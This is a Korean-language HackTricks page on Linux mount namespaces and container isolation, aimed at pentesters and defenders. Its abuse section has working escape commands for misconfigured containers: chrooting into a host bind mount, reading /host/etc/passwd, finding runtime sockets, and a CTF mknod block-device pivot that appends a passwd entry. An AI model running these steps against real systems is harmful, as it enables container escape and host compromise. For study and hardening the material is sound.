# 마운트 네임스페이스

{{#include ../../../../../banners/hacktricks-training.md}}

## 개요

마운트 네임스페이스는 프로세스가 보는 **마운트 테이블**을 제어합니다. 루트 파일시스템, 바인드 마운트(bind mounts), tmpfs 마운트, procfs 뷰, sysfs 노출 및 많은 런타임별 헬퍼 마운트가 모두 해당 마운트 테이블을 통해 표현되므로 이는 컨테이너 격리 기능 중 가장 중요한 것들 중 하나입니다. 두 프로세스가 모두 `/`, `/proc`, `/sys`, 또는 `/tmp`에 접근할 수 있지만, 그 경로들이 실제로 무엇을 가리키는지는 해당 프로세스가 속한 마운트 네임스페이스에 따라 달라집니다.

컨테이너 보안 관점에서 마운트 네임스페이스는 종종 "깔끔하게 준비된 애플리케이션 파일시스템"과 "이 프로세스가 호스트 파일시스템을 직접 볼 수 있거나 영향을 줄 수 있음"을 구분하는 요소입니다. 그래서 바인드 마운트, `hostPath` 볼륨, 특권 마운트 작업, 그리고 쓰기 가능한 `/proc` 또는 `/sys` 노출이 모두 이 네임스페이스와 관련되어 있습니다.

## 동작

런타임이 컨테이너를 시작할 때, 일반적으로 새로운 마운트 네임스페이스를 생성하고 컨테이너용 루트 파일시스템을 준비하며 필요에 따라 procfs 및 기타 헬퍼 파일시스템을 마운트한 다음 선택적으로 바인드 마운트, tmpfs 마운트, secrets, config maps, 또는 host paths를 추가합니다. 일단 해당 프로세스가 네임스페이스 내부에서 실행되면, 그 프로세스가 보는 마운트 집합은 호스트의 기본 뷰와 크게 분리됩니다. 호스트는 여전히 실제 기본 파일시스템을 볼 수 있지만, 컨테이너는 런타임이 조립해준 버전을 보게 됩니다.

이는 컨테이너가 자체 루트 파일시스템을 가지고 있다고 믿게 하는 강력한 기능이지만, 런타임이 잘못된 마운트를 노출하면 그 프로세스가 보안 모델의 나머지 부분이 보호하도록 설계되지 않은 호스트 리소스에 갑자기 접근할 수 있게 되어 위험하기도 합니다.

## 실습

개별 마운트 네임스페이스를 생성하려면:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
해당 namespace 밖에서 다른 shell을 열고 mount table을 확인하면 tmpfs mount가 격리된 mount namespace 내부에만 존재하는 것을 볼 수 있습니다. 이는 마운트 격리가 추상적인 이론이 아니라 kernel이 문자 그대로 프로세스에 다른 mount table을 제공하고 있음을 보여주기 때문에 유용한 실습입니다.

해당 namespace 밖에서 다른 shell을 열고 mount table을 확인하면 tmpfs mount는 격리된 mount namespace 내부에서만 존재합니다.

컨테이너 내부에서는 간단한 비교는 다음과 같습니다:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
두 번째 예시는 런타임 구성 하나가 파일시스템 경계를 통해 얼마나 쉽게 큰 구멍을 뚫을 수 있는지 보여준다.

## Runtime Usage

Docker, Podman, containerd-based stacks, and CRI-O는 일반 컨테이너에 대해 모두 프라이빗 마운트 네임스페이스에 의존한다. Kubernetes는 같은 메커니즘을 볼륨, projected secrets, config maps, 및 `hostPath` 마운트에 대해 기반으로 사용한다. Incus/LXC 환경도 마운트 네임스페이스에 크게 의존하며, 특히 system 컨테이너는 application 컨테이너보다 더 풍부하고 기계에 가까운 파일시스템을 노출하는 경우가 많다.

이는 컨테이너 파일시스템 문제를 검토할 때 보통 고립된 Docker 특이점을 보는 것이 아니라는 뜻이다. 당신이 보는 것은 워크로드를 띄운 플랫폼을 통해 표현된 마운트 네임스페이스 및 런타임 구성 문제다.

## Misconfigurations

가장 명백하고 위험한 실수는 바인드 마운트를 통해 호스트 루트 파일시스템 또는 다른 민감한 호스트 경로를 노출하는 것이다. 예를 들어 `-v /:/host` 혹은 Kubernetes의 쓰기 가능한 `hostPath` 같은 경우다. 그 시점에서 질문은 더 이상 "컨테이너가 어떻게든 탈출할 수 있나?"가 아니라 "얼마나 많은 유용한 호스트 콘텐츠가 이미 직접 보이고 쓰기 가능한가?"가 된다. 쓰기 가능한 호스트 바인드 마운트는 종종 나머지 익스플로잇을 파일 배치, chrooting, 설정 변경, 또는 런타임 소켓 발견 같은 간단한 문제로 만들어 버린다.

또 다른 흔한 문제는 호스트의 `/proc` 또는 `/sys`를 컨테이너의 더 안전한 보기(view)를 우회하도록 노출하는 것이다. 이 파일시스템들은 일반 데이터 마운트가 아니며, 커널 및 프로세스 상태에 대한 인터페이스다. 워크로드가 호스트 버전들에 직접 접근하면 컨테이너 보안 강화에 대한 많은 가정들이 더 이상 깔끔하게 적용되지 않는다.

읽기 전용 보호도 중요하다. 읽기 전용 루트 파일시스템이 컨테이너를 마법처럼 안전하게 하지는 않지만, 공격자의 스테이징 공간을 크게 줄이고 지속성, helper-binary 배치, 설정 변조를 더 어렵게 만든다. 반대로 쓰기 가능한 루트나 쓰기 가능한 호스트 바인드 마운트는 공격자가 다음 단계를 준비할 수 있는 여지를 준다.

## Abuse

마운트 네임스페이스가 잘못 사용되면, 공격자는 일반적으로 네 가지 중 하나를 한다. 그들은 **컨테이너 외부에 있어야 할 호스트 데이터를 읽는다**. 그들은 **쓰기 가능한 바인드 마운트를 통해 호스트 구성을 수정한다**. 그들은 **capabilities와 seccomp가 허용하면 추가 리소스를 마운트하거나 다시 마운트한다**. 또는 그들은 **컨테이너 플랫폼 자체에 더 많은 접근을 요구할 수 있도록 강력한 소켓과 런타임 상태 디렉터리에 접근한다**.

컨테이너가 이미 호스트 파일시스템을 볼 수 있다면 남은 보안 모델은 즉시 바뀐다.

호스트 바인드 마운트가 의심될 때는 먼저 사용 가능한 것이 무엇이고 그것이 쓰기 가능한지 여부를 확인하라:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
호스트 루트 파일시스템이 read-write로 마운트되어 있다면, 호스트에 직접 접근하는 것은 종종 다음과 같습니다:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
목표가 직접적인 chrooting이 아니라 권한 있는 런타임 접근이라면, 소켓과 런타임 상태를 열거하라:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
만약 `CAP_SYS_ADMIN` 권한이 있다면, 컨테이너 내부에서 새 마운트를 생성할 수 있는지도 테스트해보세요:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### 전체 예시: Two-Shell `mknod` Pivot

더 특화된 악용 경로는 container의 root user가 block devices를 생성할 수 있고, host와 container가 유용한 방식으로 사용자 식별자를 공유하며, 공격자가 이미 host에 낮은 권한의 foothold를 가지고 있는 경우에 나타납니다. 그런 상황에서는 container가 `/dev/sda` 같은 device node를 생성할 수 있고, 이후 낮은 권한의 host user가 해당 container 프로세스에 대해 `/proc/<pid>/root/`를 통해 이를 읽을 수 있습니다.

container 내부:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
호스트에서, 컨테이너 셸 PID를 찾은 후 해당 낮은 권한 사용자로서:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
중요한 교훈은 정확한 CTF string search가 아니라는 것이다. mount-namespace 노출을 통해 `/proc/<pid>/root/`가 호스트 사용자가 container-created device nodes를 재사용할 수 있게 만들 수 있으며, 이는 cgroup device policy가 container 내부에서의 직접 사용을 차단했을 때도 마찬가지다.

## 검사

이 명령들은 현재 프로세스가 실제로 존재하는 filesystem view를 보여주기 위한 것이다. 목표는 host-derived mounts, writable sensitive paths, 그리고 일반적인 application container root filesystem보다 더 넓어 보이는 모든 항목을 찾아내는 것이다.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
- 바인드 마운트는 호스트에서 온 것들로, 특히 `/`, `/proc`, `/sys`, 런타임 상태 디렉터리(runtime state directories)나 소켓 위치는 즉시 눈에 띄어야 합니다.
- 예기치 않은 읽기-쓰기 마운트는 보통 많은 수의 읽기 전용 헬퍼 마운트보다 더 중요합니다.
- `mountinfo`는 경로가 실제로 호스트 기반인지 오버레이 기반인지 확인하기에 가장 좋은 곳인 경우가 많습니다.

이러한 검사로 **어떤 리소스가 이 네임스페이스에서 보이는지**, **어떤 것이 호스트 기반인지**, 그리고 **그 중 어떤 것이 쓰기 가능하거나 보안에 민감한지**를 파악할 수 있습니다.
{{#include ../../../../../banners/hacktricks-training.md}}
